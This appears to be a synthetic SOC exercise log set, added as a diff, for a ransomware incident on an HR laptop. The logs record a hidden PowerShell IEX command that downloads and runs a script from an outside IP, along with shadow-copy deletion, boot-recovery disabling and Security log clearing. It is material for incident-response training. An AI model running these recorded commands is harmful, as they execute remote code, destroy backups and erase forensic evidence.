@@ -1,0 +1,59 @@
+SOC Incident Logs - Case 4: Ransomware Event (Enterprise Windows + EDR + Network)
+Environment: ACME-CORP
+Time zone: UTC
+Log sources: Windows Security, EDR, Sysmon, File Server Audit, Firewall/Proxy
+------------------------------------------------------------------------------------------------------------------------
+
+[EDR] Alert Summary
+Timestamp (UTC)           Host        Severity  Alert Name                                  Notes
+------------------------  ----------  --------  ------------------------------------------  ---------------------------------------------------------------
+2026-03-11T03:18:44.501Z  HR-LT-021   Critical  Ransomware behavior detected                 High file modification rate + shadow copy deletion + encryption
+2026-03-11T03:19:02.110Z  HR-LT-021   High      Suspicious process chain (Office → PowerShell) Macro-like behavior leading to payload execution
+
+------------------------------------------------------------------------------------------------------------------------
+[Windows Security] Endpoint: HR-LT-021 (10.20.18.21)  User: ACME\\m.johnson
+EventID  Timestamp (UTC)           Computer   User              Details
+------   ------------------------  ---------  ----------------  --------------------------------------------------------------------------------------------
+4688     2026-03-11T03:14:07.122Z  HR-LT-021  ACME\\m.johnson   New Process: WINWORD.EXE  CmdLine: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\m.johnson\\Downloads\\Invoice_March2026.docm"
+4688     2026-03-11T03:14:19.908Z  HR-LT-021  ACME\\m.johnson   New Process: powershell.exe CmdLine: powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('hxxp://203.0.113.77/a.ps1')"
+4688     2026-03-11T03:14:33.540Z  HR-LT-021  ACME\\m.johnson   New Process: cmd.exe       CmdLine: cmd.exe /c vssadmin delete shadows /all /quiet
+4688     2026-03-11T03:14:36.882Z  HR-LT-021  ACME\\m.johnson   New Process: bcdedit.exe    CmdLine: bcdedit /set {default} recoveryenabled No
+4688     2026-03-11T03:14:40.133Z  HR-LT-021  ACME\\m.johnson   New Process: wevtutil.exe   CmdLine: wevtutil cl Security
+
+------------------------------------------------------------------------------------------------------------------------
+[Sysmon] Endpoint: HR-LT-021
+EventID  Timestamp (UTC)           Image                                      ParentImage                                 CommandLine
+------   ------------------------  -----------------------------------------  ------------------------------------------  -------------------------------------------------------------
+1        2026-03-11T03:14:20.012Z  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  ...\\WINWORD.EXE         powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command IEX(...)
+3        2026-03-11T03:14:20.901Z  powershell.exe                              WINWORD.EXE                                 NetworkConnect: DestinationIp=203.0.113.77 DestinationPort=80
+1        2026-03-11T03:15:02.774Z  C:\\Users\\m.johnson\\AppData\\Roaming\\svchost.exe  powershell.exe                            "C:\\Users\\m.johnson\\AppData\\Roaming\\svchost.exe" -k netsvcs
+11       2026-03-11T03:15:03.210Z  svchost.exe                                  powershell.exe                              FileCreate: C:\\Users\\m.johnson\\Desktop\\README_RESTORE_FILES.txt
+11       2026-03-11T03:15:04.520Z  svchost.exe                                  powershell.exe                              FileCreate: C:\\Users\\m.johnson\\Documents\\Q1_Budget.xlsx.locked
+11       2026-03-11T03:15:04.701Z  svchost.exe                                  powershell.exe                              FileCreate: C:\\Users\\m.johnson\\Documents\\HR_Records_2026.xlsx.locked
+
+------------------------------------------------------------------------------------------------------------------------
+[File Server Audit] Fileserver: FS-01 (10.20.40.10)  Share: \\\\FS-01\\HR$
+Timestamp (UTC)           User              Source Host  Action   File Path                                      Notes
+------------------------  ----------------  -----------  -------  ---------------------------------------------  -----------------------------------------
+2026-03-11T03:16:01.102Z  ACME\\m.johnson   HR-LT-021    Modify   \\\\FS-01\\HR$\\Policies\\Benefits2026.docx     Rapid modifications from single endpoint
+2026-03-11T03:16:01.311Z  ACME\\m.johnson   HR-LT-021    Rename   \\\\FS-01\\HR$\\Policies\\Benefits2026.docx     Renamed to Benefits2026.docx.locked
+2026-03-11T03:16:02.044Z  ACME\\m.johnson   HR-LT-021    Rename   \\\\FS-01\\HR$\\Payroll\\March2026.xlsx         Renamed to March2026.xlsx.locked
+2026-03-11T03:16:02.189Z  ACME\\m.johnson   HR-LT-021    Create   \\\\FS-01\\HR$\\README_RESTORE_FILES.txt        Ransom note staged on share
+2026-03-11T03:18:31.907Z  ACME\\m.johnson   HR-LT-021    Alert    \\\\FS-01\\HR$\\*                               >1500 file renames within 3 minutes
+
+------------------------------------------------------------------------------------------------------------------------
+[Firewall/Proxy] edge-fw-01 / proxy-01
+Timestamp (UTC)           Source IP     Host        Action  Dest IP         Dest Port  URL/Notes
+------------------------  ------------  ----------  ------  --------------  ---------  -------------------------------------------------------------
+2026-03-11T03:14:20.944Z  10.20.18.21   HR-LT-021   ALLOW   203.0.113.77     80         HTTP GET /a.ps1 (script download)
+2026-03-11T03:15:10.610Z  10.20.18.21   HR-LT-021   ALLOW   198.51.100.44    443        TLS to suspicious VPS (possible key exchange/C2)
+2026-03-11T03:16:55.303Z  10.20.18.21   HR-LT-021   ALLOW   198.51.100.44    443        Repeated beaconing every ~60s
+
+------------------------------------------------------------------------------------------------------------------------
+Analyst notes (auto-generated correlation fields)
+AlertName="Ransomware behavior detected"
+Host="HR-LT-021"
+User="ACME\\m.johnson"
+RansomNote="README_RESTORE_FILES.txt"
+ExtensionObserved=".locked"
+ShadowCopyDeletion="vssadmin delete shadows /all /quiet"
